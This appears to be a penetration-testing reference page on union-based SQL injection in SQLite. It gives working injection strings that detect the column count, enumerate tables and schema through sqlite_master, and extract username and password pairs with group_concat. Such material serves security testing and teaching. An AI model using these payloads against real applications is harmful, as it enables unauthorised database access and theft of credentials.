---
title: "Union-based SQL injection in SQLite"
description: "Using UNION SELECT in SQLite to extract data, taking advantage of loose typing, and reading the schema and data through sqlite_master."
keywords:
  - union based SQL injection
  - UNION SELECT SQLite
  - sqlite_master
  - group_concat
  - loose typing
---

# Union-based

A `UNION SELECT` appends attacker-chosen rows to a returned result. SQLite makes this easy because it is loosely typed: a text value sits happily in a column the original query treated as a number, so type mismatches rarely block a union the way they do in PostgreSQL or Oracle.

Detect the column count with `ORDER BY` ordinals or incremental `UNION SELECT NULL`:

```sql
' ORDER BY 3-- 
' UNION SELECT NULL,NULL,NULL-- 
```

SQLite does not require a `FROM`, so `UNION SELECT 1,2,3` works for probing without a table. A wrong column count raises `SELECTs to the left and right of UNION do not have the same number of result columns`.

Enumerate and extract through `sqlite_master`, using `group_concat()` to pack rows into one cell:

```sql
' UNION SELECT group_concat(name),NULL,NULL FROM sqlite_master WHERE type='table'-- 
' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE name='users'-- 
```

The `sql` column gives the column names directly, after which data is read from the target table:

```sql
' UNION SELECT group_concat(username||':'||password,char(10)),NULL,NULL FROM users-- 
```

`char(10)` is a newline separator (SQLite `char()` is like other engines' `CHR()`). Row limiting uses `LIMIT` (SQLite does support it, unlike Oracle or SQL Server), so `LIMIT 1 OFFSET n` pages through rows when `group_concat` output is truncated by the application.

## References

- SQLite Documentation: UNION, `sqlite_master`, group_concat, char
- OWASP Testing Guide: Testing for SQL Injection
